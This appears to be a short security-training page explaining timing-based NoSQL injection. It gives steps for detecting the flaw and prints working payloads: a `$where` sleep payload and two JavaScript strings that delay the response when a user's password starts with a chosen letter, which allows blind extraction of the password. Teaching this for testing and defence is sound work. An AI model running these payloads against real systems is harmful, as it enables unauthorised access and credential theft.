# Timing based injection

## Time Based Injection

Sometimes triggering a database error doesn't cause a difference in the application's response. In this situation, you may still be able to detect and exploit the vulnerability by using JavaScript injection to trigger a conditional time delay.

To conduct timing-based NoSQL injection:

1. Load the page several times to determine a baseline loading time.
2. Insert a timing based payload into the input. A timing based payload causes an intentional delay in the response when executed. For example, `{"$where": "sleep(5000)"}` causes an intentional delay of 5000 ms on successful injection.
3. Identify whether the response loads more slowly. This indicates a successful injection.

The following timing based payloads will trigger a time delay if the password beings with the letter `a`:

```
admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]==="a") && waitTill > new Date()){};}(this)+'
```

```
admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'
```
